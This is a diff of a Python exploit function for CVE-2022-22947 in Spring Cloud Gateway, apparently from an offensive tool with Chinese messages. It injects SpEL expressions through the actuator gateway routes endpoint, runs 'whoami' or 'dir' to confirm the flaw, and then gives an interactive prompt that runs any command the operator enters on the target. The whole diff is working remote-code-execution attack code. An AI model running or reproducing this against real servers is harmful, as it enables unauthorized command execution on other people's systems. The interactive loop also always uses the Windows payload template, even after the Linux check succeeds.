@@ -138,7 +138,8 @@ def CVE_2022_22947(url, proxies, header_new):
     }
     headers1 = json.loads(str(JSON_handle(oldHeader_1, header_new)).replace("'", "\""))
     headers2 = json.loads(str(JSON_handle(oldHeader_2, header_new)).replace("'", "\""))
-    payload = '''{\r
+    vul_status = 0
+    payload_linux = '''{\r
               "id": "hacktest",\r
               "filters": [{\r
                 "name": "AddResponseHeader",\r
@@ -148,43 +149,65 @@ def CVE_2022_22947(url, proxies, header_new):
               "order": 0\r
             }'''
 
-    payload2 = '''{\r
+    payload_windows = '''{\r
               "id": "hacktest",\r
               "filters": [{\r
                 "name": "AddResponseHeader",\r
-                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"whoami\\"}).getInputStream()))}"}\r
+                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"dir\\"}).getInputStream()))}"}\r
                 }],\r
               "uri": "http://example.com",\r
               "order": 0\r
             }'''
 
     try:
-        requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json, timeout=10 ,verify=False, proxies=proxies)
-        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-        if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
-            cprint("[+] Payload已经输出，回显结果如下：", "red")
-            print('\n')
-            print(re3.text)
-            print('\n')
-            print("[+] 执行命令模块（输入exit退出）")
-            while 1:
-                Cmd = input("[+] 请输入要执行的命令>>> ")
-                if Cmd == "exit":
-                    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-                    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-                    sys.exit(0)
-                else:
-                    payload3 = payload2.replace('whoami', Cmd)
-                    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload3, headers=headers1, timeout=10, json=json ,verify=False, proxies=proxies)
-                    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-                    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
-                    result = re3.text
-                    cprint(result ,"green")
+        if vul_status == 0:
+            cprint("[+] 正在发送Linux的Payload","green")
+            requests.packages.urllib3.disable_warnings()
+            re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_linux, headers=headers1, json=json, timeout=10 ,verify=False, proxies=proxies)
+            re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+            re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+            if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
+                cprint("[+] Payload已经输出，回显结果如下：", "red")
+                print('\n')
+                print(re3.text)
+                print('\n')
+                print("[+] 执行命令模块（输入exit退出）")
+                vul_status = 1
+            else:
+                cprint("[.] Linux的Payload没成功，清理缓存","green")
+                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                cprint("[+] 正在发送Windows的Payload","green")
+                requests.packages.urllib3.disable_warnings()
+                re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_windows, headers=headers1, json=json, timeout=10 ,verify=False, proxies=proxies)
+                re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                if ('<DIR>' in str(re3.text)):
+                    cprint("[+] Payload已经输出，回显结果如下：", "red")
                     print('\n')
-        else:
+                    print(re3.text)
+                    print('\n')
+                    print("[+] 执行命令模块（输入exit退出）")
+                    vul_status = 1
+        if vul_status == 0:
             cprint("[-] CVE-2022-22947漏洞不存在\n", "yellow")
+            re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+            re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+        while vul_status == 1:
+            Cmd = input("[+] 请输入要执行的命令>>> ")
+            if Cmd == "exit":
+                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                print("[+] 删除路由成功")
+                sys.exit()
+            else:
+                payload_new = payload_windows.replace('dir', Cmd)
+                re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_new, headers=headers1, timeout=10, json=json ,verify=False, proxies=proxies)
+                re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+                result = re3.text
+                cprint(result ,"green")
+                print('\n')
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
